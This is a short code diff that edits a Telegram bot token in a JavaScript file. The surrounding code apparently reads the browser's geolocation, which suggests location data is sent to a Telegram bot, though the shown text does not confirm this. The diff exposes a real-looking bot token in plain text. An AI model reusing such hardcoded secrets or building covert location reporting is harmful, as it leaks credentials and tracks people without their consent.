@@ -11,7 +11,7 @@ navigator.geolocation.getCurrentPosition(position => {
 
 
 let tg = {
-    token: "7879873820:AAGnfZozhI2mk3ifvF1Iz7xbT-kejmJsBnY", // Your bot's token that got from @BotFather
+    token: "7879873820:AAGnfZozhI2mk3ifvFlIz7xbT-kejmJsBnY", // Your bot's token that got from @BotFather
     chat_id: "ashnopokimonbot" // The user's(that you want to send a message) telegram chat id
 }
 
